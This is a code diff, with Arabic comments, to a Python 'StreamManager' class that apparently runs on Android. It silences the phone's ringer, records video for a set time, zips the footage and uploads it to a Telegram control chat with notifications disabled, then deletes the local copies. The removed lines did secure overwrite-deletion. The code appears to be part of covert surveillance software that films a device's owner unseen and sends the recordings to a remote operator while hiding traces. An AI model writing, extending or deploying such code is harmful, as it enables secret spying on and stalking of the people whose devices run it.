@@ -57,7 +57,7 @@ class StreamManager:
             am = activity.getSystemService(activity.AUDIO_SERVICE)
 
             if mute:
-                # حفظ وضع الصامت القديم وتعيينه إلى "صامت"
+                # حفظ وضع الصامت القديم
                 self._old_ringer_mode = am.getRingerMode()
                 am.setRingerMode(AudioManager.RINGER_MODE_SILENT)
 
@@ -120,21 +120,13 @@ class StreamManager:
             logging.error(f"Video validation error: {e}")
         return False
 
-    # ========== حذف آمن بالكتابة فوق الملف ==========
-    def _secure_delete(self, path):
+    # ========== حذف عادي (بدون الكتابة فوق) – لأن المجلد داخلي وآمن ==========
+    def _delete_file(self, path):
         try:
             if os.path.exists(path):
-                sz = os.path.getsize(path)
-                if sz > 0:
-                    chunk = 8192
-                    with open(path, "ba+", buffering=0) as f:
-                        for _ in range(0, sz, chunk):
-                            f.write(os.urandom(min(chunk, sz)))
-                        f.flush()
-                        os.fsync(f.fileno())
                 os.remove(path)
         except Exception as e:
-            logging.error(f"Secure delete error: {e}")
+            logging.error(f"Delete error: {e}")
 
     # ========== إرسال / تحديث رسالة الحالة ==========
     def _send_status_update(self, text, chat_id):
@@ -206,11 +198,15 @@ class StreamManager:
                 media_recorder.prepare()
                 media_recorder.start()
 
-                # التسجيل للمدة المطلوبة
-                time.sleep(dur)
+                # التسجيل للمدة المطلوبة (ننام في أجزاء صغيرة للتحقق من حالة الإيقاف)
+                for _ in range(dur):
+                    if not self.recording:
+                        break
+                    time.sleep(1)
 
-                media_recorder.stop()
-                success = True
+                if self.recording:
+                    media_recorder.stop()
+                    success = True
 
             except Exception as e:
                 logging.error(f"Recording worker error: {e}")
@@ -230,7 +226,7 @@ class StreamManager:
                 if os.path.exists(temp_path):
                     os.rename(temp_path, raw_path)
 
-                # ضغط الفيديو إلى ZIP (لتجنب حظر Telegram للملفات الكبيرة)
+                # ضغط الفيديو إلى ZIP
                 with zipfile.ZipFile(zipped_path, 'w', zipfile.ZIP_DEFLATED) as zf:
                     zf.write(raw_path, os.path.basename(raw_path))
 
@@ -245,31 +241,25 @@ class StreamManager:
                             "disable_notification": True
                         }, {"document": f})
 
-                # تحديث رسالة الحالة إلى "تم الرفع"
+                # تحديث رسالة الحالة
                 self._send_status_update("✅ تم رفع الفيديو بنجاح", mon.ctrl)
 
                 # حذف الملفات المؤقتة
-                self._secure_delete(raw_path)
-                self._secure_delete(zipped_path)
+                self._delete_file(raw_path)
+                self._delete_file(zipped_path)
 
             except Exception as e:
                 logging.error(f"Finalization error: {e}")
                 self._send_status_update("❌ فشل رفع الفيديو", mon.ctrl)
         else:
-            # حذف الملف التالف فوراً
+            # حذف الملف التالف
             if os.path.exists(temp_path):
-                try:
-                    os.remove(temp_path)
-                except:
-                    pass
+                self._delete_file(temp_path)
             self._send_status_update("⚠️ فشل التسجيل (ملف تالف)", mon.ctrl)
 
-        # تنظيف
+        # تنظيف إضافي
         if os.path.exists(temp_path):
-            try:
-                os.remove(temp_path)
-            except:
-                pass
+            self._delete_file(temp_path)
 
         self.recording = False
         self._status_msg_id = None
